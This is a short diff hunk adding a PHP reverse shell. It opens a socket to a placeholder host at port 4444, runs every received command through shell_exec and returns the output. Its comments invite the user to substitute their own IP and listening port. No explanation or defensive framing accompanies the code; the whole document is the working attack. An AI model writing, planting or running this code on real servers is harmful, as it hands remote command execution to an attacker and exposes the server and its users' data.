@@ -1,0 +1,11 @@
+$host = '10.13.68.33'; // Replace with your IP address
+$port = 4444;      // Replace with your listening port
+
+$sock = fsockopen($host, $port);
+if ($sock) {
+    while ($cmd = fgets($sock)) {
+        $output = shell_exec($cmd);
+        fwrite($sock, $output);
+    }
+    fclose($sock);
+}
